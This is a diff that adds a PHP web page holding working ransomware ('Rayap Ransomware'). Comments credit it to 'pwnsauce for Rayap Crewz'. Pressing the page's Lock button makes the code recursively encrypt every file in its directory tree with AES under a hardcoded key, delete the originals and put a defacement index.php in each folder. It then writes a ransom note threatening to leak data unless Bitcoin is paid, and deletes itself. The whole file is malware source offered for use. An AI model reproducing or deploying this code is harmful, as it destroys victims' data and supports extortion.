@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <form action="" method="post" enctype="multipart/form-data">
+        <button type="submit" name="lock" value="Lock">Lock</button>
+    </form>
+
+<?php
+// this ransomware/ransomweb crated by pwnsauce for Rayap Crewz 2024
+// ransomware/ransomweb ini dibuat oleh gw sendiri alias pwnsauce untuk Rayap Crewz
+// fitur: mengunci semua content dari sebuah file dengan algoritma yang kuat, extensi .rayap, 
+// menghapus diri sendiri setelah enkripsi selesai, drop README_RAYAP.txt & index.php customizable tentunya,
+// mass upload index.php & README_RAYAP.txt
+// more features coming soon, susah anjing bagi waktunya ngentot emang dunia kuliah bangsat, gw ledakin juga ni dunia
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lock'])) {
+    $self = __FILE__;
+    $targetDir = dirname($self);
+    $key = 'd99be6605fe86a1fb92d8139b70869e91efa02edd01f51837803d6b38d8893fb';
+    function deriveKey($password, $salt, $iterations = 10000, $keyLength = 32) {
+        return hash_pbkdf2('sha256', $password, $salt, $iterations, $keyLength, true);
+    }
+    function encrypt($data, $password) {
+        $salt = openssl_random_pseudo_bytes(16);
+        $iv = openssl_random_pseudo_bytes(16);
+        $key = deriveKey($password, $salt);
+
+        $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
+        return $salt . $iv . $encrypted;
+    }
+    function encryptFiles($dir, $password, $self, $indexFilePath) {
+        $files = scandir($dir);
+
+        foreach ($files as $file) {
+            if ($file != '.' && $file != '..') {
+                $filePath = $dir . DIRECTORY_SEPARATOR . $file;
+
+                if ($filePath == $self || $filePath == $indexFilePath) {
+                    continue;
+                }
+
+                if (pathinfo($filePath, PATHINFO_EXTENSION) == 'rayap') {
+                    continue;
+                }
+
+                if (is_dir($filePath)) {
+                    encryptFiles($filePath, $password, $self, $indexFilePath);
+                    copy($indexFilePath, $filePath . DIRECTORY_SEPARATOR . 'index.php');
+                } else {
+                    $data = file_get_contents($filePath);
+                    if ($data !== false) {
+                        $encryptedData = encrypt($data, $password);
+                        file_put_contents($filePath . '.rayap', $encryptedData);
+                        unlink($filePath);
+                    }
+                }
+            }
+        }
+    }
+    function createReadmeFile($dir) {
+        $readmeContent = "You've become the victims of Rayap Ransomware.\n\n" .
+                         "All sensetive information was stolen from the servers and will be uploaded to the public if you didn't pay the ransom in 2 days.\n" .
+                         "To get the files in your network decrypted you should pay for the decryptor (Rayap Decryptor), which we'll send the decryptor after the payment is confirmed.\n\n" .
+                         "The price for the decryptor is based on the total encrypted file size in the network/servers, contact us through that email for amount of BTC should be paid and the BTC address, provide your Encryption ID in your message.\n" .
+                         "To recover all your files, contact us at victims.of.rayap@example.com.\n\n" .
+                         "Do not rename the encrypted files or the extensions, Do not move the encrypted files, Do not attempt to decrypt the encrypted files by yourself or using someone services, its encrypted with a strong algorythm may lead to the impossibility of recovery of the certain files, only our decryptor can decrypt the encryption.\n" .
+                         "Don't forget to Provide your Encryption ID in your message, otherwise we'll not reply your massage.";
+        file_put_contents($dir . DIRECTORY_SEPARATOR . 'README_RAYAP.txt', $readmeContent);
+    }
+    function generateRandomID($length = 6) {
+        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        $randomID = '';
+        for ($i = 0; $i < $length; $i++) {
+            $randomID .= $characters[rand(0, strlen($characters) - 1)];
+        }
+        return $randomID;
+    }
+    function createDefaultIndexContent($id) {
+        $content = "<h1>Encrypted by Rayap Ransomware</h1><br><br>\n" .
+                   "See <b>README_RAYAP.txt</b> for more information.<br>\n" .
+                   "<br><br><br><h2>Your Encryption ID: <b>$id</b></h2>\n";
+        return $content;
+    }
+    $randomID = generateRandomID();
+    $defaultIndexContent = createDefaultIndexContent($randomID);
+    $indexFilePath = $targetDir . DIRECTORY_SEPARATOR . 'index.php';
+    file_put_contents($indexFilePath, $defaultIndexContent);
+    encryptFiles($targetDir, $key, $self, $indexFilePath);
+    createReadmeFile($targetDir);
+    unlink($self);
+    echo "<br>complete.";
+}
+?>
+</body>
+</html>
